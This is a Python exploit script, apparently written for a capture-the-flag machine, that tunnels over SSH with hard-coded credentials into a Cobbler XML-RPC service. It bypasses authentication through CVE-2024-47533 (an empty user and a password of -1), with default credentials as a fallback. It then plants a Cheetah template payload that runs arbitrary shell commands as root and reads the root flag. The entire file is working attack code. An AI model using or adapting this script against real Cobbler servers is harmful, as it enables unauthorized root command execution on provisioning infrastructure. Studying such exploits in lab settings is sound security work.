#!/usr/bin/env python3
"""Cobbler XML-RPC privesc — CVE-2024-47533 auth bypass + Cheetah template RCE."""
import argparse
import select
import socket
import sys
import threading
import time
import xmlrpc.client
from pathlib import Path

try:
    import paramiko
except ImportError:
    print("pip install paramiko in a venv", file=sys.stderr)
    sys.exit(1)

TARGET = "10.129.122.97"
USER = "cobble"
PASSWORD = "iluvdannymorethanyouknow"
LOCAL_PORT = 25151
REMOTE_HOST = "127.0.0.1"
REMOTE_PORT = 25151
ART = Path(__file__).resolve().parent.parent / "artifacts"


def _forward_handler(client, host, port, transport):
  try:
    chan = transport.open_channel("direct-tcpip", (host, port), client.getpeername())
  except Exception:
    client.close()
    return
  if chan is None:
    client.close()
    return
  while True:
    r, _, _ = select.select([client, chan], [], [])
    if client in r:
      data = client.recv(1024)
      if not data:
        break
      chan.send(data)
    if chan in r:
      data = chan.recv(1024)
      if not data:
        break
      client.send(data)
  chan.close()
  client.close()


def tunnel():
  """SSH local port forward LOCAL_PORT -> REMOTE_HOST:REMOTE_PORT."""
  transport = paramiko.Transport((TARGET, 22))
  transport.connect(username=USER, password=PASSWORD)
  sock = socket.socket()
  sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  sock.bind(("127.0.0.1", LOCAL_PORT))
  sock.listen(5)
  print(f"[+] Tunnel 127.0.0.1:{LOCAL_PORT} -> {REMOTE_HOST}:{REMOTE_PORT}")
  while transport.is_active():
    client, _ = sock.accept()
    threading.Thread(
      target=_forward_handler,
      args=(client, REMOTE_HOST, REMOTE_PORT, transport),
      daemon=True,
    ).start()


def get_proxy():
  return xmlrpc.client.ServerProxy(f"http://127.0.0.1:{LOCAL_PORT}/")


def auth(proxy):
  try:
    token = proxy.login("", -1)
    print("[+] Auth via CVE-2024-47533 (empty user, password -1)")
    return token
  except Exception:
    token = proxy.login("cobbler", "cobbler")
    print("[+] Auth via default creds cobbler:cobbler")
    return token


def setup_rce(proxy, token, template="pwn.ks", distro="pwn-dist", profile="pwn-prof"):
  payload = '#set $res = __import__("os").popen("id").read()\n$res'
  proxy.write_autoinstall_template(template, payload, token)

  d = proxy.new_distro(token)
  proxy.modify_distro(d, "name", distro, token)
  proxy.modify_distro(d, "kernel", "/vmlinuz", token)
  proxy.modify_distro(d, "initrd", "/initrd.img", token)
  proxy.modify_distro(d, "breed", "redhat", token)
  proxy.save_distro(d, token)

  pr = proxy.new_profile(token)
  proxy.modify_profile(pr, "name", profile, token)
  proxy.modify_profile(pr, "distro", distro, token)
  proxy.modify_profile(pr, "autoinstall", template, token)
  proxy.save_profile(pr, token)
  return profile


def run_cmd(proxy, token, cmd, template="pwn.ks", profile="pwn-prof"):
  payload = f'#set $res = __import__("os").popen({cmd!r}).read()\n$res'
  proxy.write_autoinstall_template(template, payload, token)
  return proxy.generate_autoinstall(profile)


def main():
  parser = argparse.ArgumentParser()
  parser.add_argument("cmd", nargs="?", default="cat /root/root.txt")
  parser.add_argument("--tunnel-only", action="store_true")
  args = parser.parse_args()

  t = threading.Thread(target=tunnel, daemon=True)
  t.start()
  time.sleep(2)

  if args.tunnel_only:
    while True:
      time.sleep(60)

  proxy = get_proxy()
  print("[*] Cobbler version:", proxy.version())
  token = auth(proxy)
  setup_rce(proxy, token)
  out = run_cmd(proxy, token, args.cmd)
  print(out)
  if "root.txt" in args.cmd or len(out) == 32:
    (ART / "root.txt").write_text(out.strip() + "\n")
    print(f"[+] Saved to {ART / 'root.txt'}")


if __name__ == "__main__":
  main()
